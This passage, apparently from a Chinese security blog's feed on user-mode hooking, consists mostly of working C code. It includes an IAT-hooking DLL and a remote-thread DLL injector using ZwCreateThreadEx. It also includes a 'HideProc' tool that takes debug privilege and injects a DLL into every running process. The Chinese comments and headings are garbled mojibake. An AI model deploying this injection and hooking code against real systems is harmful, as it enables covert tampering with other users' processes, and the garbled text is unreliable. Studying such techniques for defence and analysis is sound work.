class="line"></span><br><span class="line">    <span class="keyword">return</span> nt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">IATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    åŸæ¥çš„MessageBox = (lPMessageBoxA)GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="comment">//è·å–ntheader</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = GetNthead();</span><br><span class="line">    <span class="comment">//è·å–FileHeader</span></span><br><span class="line">    PIMAGE_FILE_HEADER pFileHead = &amp;pNtHead-&gt;FileHeader;</span><br><span class="line">    <span class="comment">//è·å–OptionalHeader</span></span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOpHead = &amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">    HMODULE hmod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    DWORD åŸºåœ°å€ = (DWORD)hmod;</span><br><span class="line">    <span class="comment">//è·å–å¯¼å‡ºè¡¨RVAåç§»</span></span><br><span class="line">    DWORD RVA = pOpHead-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR å¯¼å…¥è¡¨ = (PIMAGE_IMPORT_DESCRIPTOR)(åŸºåœ°å€ + RVA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (å¯¼å…¥è¡¨-&gt;FirstThunk) <span class="comment">//å¯¼å…¥è¡¨-&gt;FirstThunk å¯¼å…¥è¡¨åç§»</span></span><br><span class="line">    &#123;</span><br><span class="line">        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(åŸºåœ°å€ + å¯¼å…¥è¡¨-&gt;FirstThunk);</span><br><span class="line">        <span class="keyword">while</span> (pThunk-&gt;u1.Function)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pThunk-&gt;u1.Function == (DWORD)åŸæ¥çš„MessageBox) <span class="comment">//æ‰¾åˆ°IATå¯¼å…¥åœ°å€è¡¨ä¸­çš„MessageBoxA</span></span><br><span class="line">            &#123;</span><br><span class="line">                DWORD oldProtected;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//å°†å†…å­˜æ”¹ä¸ºå¯å†™å¯è¯»å¯æ‰§è¡Œ</span></span><br><span class="line">                VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);  <span class="comment">//4 32ä½ä¸‹åœ°å€éƒ½ä¸º4ä¸ªå­—èŠ‚</span></span><br><span class="line">                pThunk-&gt;u1.Function = (DWORD)MyMessageBoxA; <span class="comment">//ä¿®æ”¹IATå€¼</span></span><br><span class="line">                VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, oldProtected, &amp;oldProtected);  </span><br><span class="line">            &#125;</span><br><span class="line">            pThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        å¯¼å…¥è¡¨++;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        IATHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, <span class="type">char</span>* szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE	hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID	pRemoteBuf;</span><br><span class="line">	DWORD	dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line">	<span class="comment">//1.ä½¿ç”¨dwPIDè·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) SUCCESS!!!\n&quot;</span>, dwPID);</span><br><span class="line">	<span class="comment">//2.åœ¨ç›®æ ‡è¿›ç¨‹å†…å­˜ä¸­åˆ†é…szdllnameå¤§å°çš„å†…å­˜</span></span><br><span class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//3.åœ¨dllè·¯å¾„å†™å…¥åˆ†é…çš„å†…å­˜ </span></span><br><span class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//4.è·å–LoadLibrary APIçš„åœ°å€</span></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	MyZwCreateThreadEx ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="comment">//5.åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è¿è¡Œçº¿ç¨‹</span></span><br><span class="line">	ZwCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d)è¿›ç¨‹åˆ›å»ºè¿œçº¿ç¨‹å¤±è´¥ ï¼ï¼ï¼\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(hThread, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if (argc != 2)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	printf(&quot;è¯·è¾“å…¥pid&quot;);</span></span><br><span class="line">	<span class="comment">//	return;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	<span class="comment">//int pid = atol(argv[1]);</span></span><br><span class="line">	InjectDll(<span class="number">12656</span>, <span class="string">&quot;C:\\Users\\test\\Desktop\\IATDll.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ³¨å…¥å·¥å…·</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*SetPid)</span><span class="params">(DWORD)</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> INJECTION_MODE = <span class="number">0</span>, EJECTION_MODE &#125;;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span></span><br><span class="line">&#123;</span><br><span class="line">	TOKEN_PRIVILEGES tp;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	LUID luid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">		&amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,            <span class="comment">// lookup privilege on local system</span></span><br><span class="line">		lpszPrivilege,   <span class="comment">// privilege to lookup </span></span><br><span class="line">		&amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">	tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">	<span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">	<span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">		FALSE,</span><br><span class="line">		&amp;tp,</span><br><span class="line">		<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">		(PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">		(PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE	hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID	pRemoteBuf;</span><br><span class="line">	DWORD	dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line">	<span class="comment">//1.ä½¿ç”¨dwPIDè·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) SUCCESS!!!\n&quot;</span>, dwPID);</span><br><span class="line">	<span class="comment">//2.åœ¨ç›®æ ‡è¿›ç¨‹å†…å­˜ä¸­åˆ†é…szdllnameå¤§å°çš„å†…å­˜</span></span><br><span class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//3.åœ¨dllè·¯å¾„å†™å…¥åˆ†é…çš„å†…å­˜ </span></span><br><span class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//4.è·å–LoadLibrary APIçš„åœ°å€</span></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	MyZwCreateThreadEx ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>),<span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="comment">//5.åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è¿è¡Œçº¿ç¨‹</span></span><br><span class="line">	ZwCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d)è¿›ç¨‹åˆ›å»ºè¿œçº¿ç¨‹å¤±è´¥ ï¼ï¼ï¼\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(hThread, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL	bMore = FALSE, bFound = FALSE;</span><br><span class="line">	HANDLE	hSnapshot, hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">	MODULEENTRY32	me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	bMore = Module32First(hSnapshot, &amp;me);</span><br><span class="line">	LPCSTR p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_tcsicmp(me.szModule, szDllPath) ||</span><br><span class="line">			!_tcsicmp(me.szExePath, szDllPath))</span><br><span class="line">		&#123;</span><br><span class="line">			bFound = TRUE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!bFound)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>),<span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line"></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	MyZwCreateThreadEx ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ZwCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d)è¿›ç¨‹åˆ›å»ºè¿œçº¿ç¨‹å¤±è´¥ ï¼ï¼ï¼\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(%d)å¸è½½DLLå®Œæˆ ï¼ï¼ï¼\n&quot;</span>, dwPID);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectAllProcess</span><span class="params">(<span class="type">int</span> nMode, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD	dwPID = <span class="number">0</span>;</span><br><span class="line">	HANDLE	hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">	PROCESSENTRY32	pe;</span><br><span class="line"></span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	Process32First(hSnapShot, &amp;pe);</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		dwPID = pe.th32ProcessID;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwPID &lt; <span class="number">100</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nMode == INJECTION_MODE)</span><br><span class="line">			InjectDll(dwPID, szDllPath);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			EjectDll(dwPID, szDllPath);</span><br><span class="line">	&#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe));</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnapShot);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>	nMode = INJECTION_MODE;</span><br><span class="line">	HMODULE	hLib = <span class="literal">NULL</span>;</span><br><span class="line">	SetPid	setPid = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n Usage  : HideProc.exe &lt;-i|-e&gt;  &lt;process id&gt; &lt;dll path&gt;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ææƒ</span></span><br><span class="line">	SetPrivilege(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">	hLib = LoadLibrary(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	setPid = (SetPid)GetProcAddress(hLib, <span class="string">&quot;SetPid&quot;</span>);</span><br><span class="line">	setPid((DWORD)atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	FreeLibrary(hLib);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!_stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-e&quot;</span>))</span><br><span class="line">		nMode = EJECTION_MODE;</span><br><span class="line"></span><br><span class="line">	InjectAllProcess(nMode, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>MessageBoxAé¶å­ç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;testtext&quot;</span>, <span class="string">&quot;testtitle&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>R3Hook</category>
      </categories>
      <tags>
        <tag>R3Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>AppInit_DLLSåŠå…¶ä»–</title>
    <url>/posts/5329b9a8/</url>
    <content><![CDATA[<p> AppInit_DLLs(æœ¬åœ°å¤ç°æœªæˆåŠŸ)</p>
<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/win7appqual/appinit-dlls-in-windows-7-and-windows-server-2008-r2?redirectedfrom=MSDN">https://learn.microsoft.com/zh-cn/windows/win32/win7appqual/appinit-dlls-in-windows-7-and-windows-server-2008-r2?redirectedfrom=MSDN</a></p>
<p><a href="https://bbs.pediy.com/thread-266985.htm#msg_header_h1_3">https://bbs.pediy.com/thread-266985.htm#msg_header_h1_3</a></p>
<p><a href="https://blog.csdn.net/qq_36374896/article/details/107005590">https://blog.csdn.net/qq_36374896/article/details/107005590</a></p>
<p><a href="https://blog.csdn.net/u013565525/article/details/28416279">https://blog.csdn.net/u013565525/article/details/28416279</a></p>
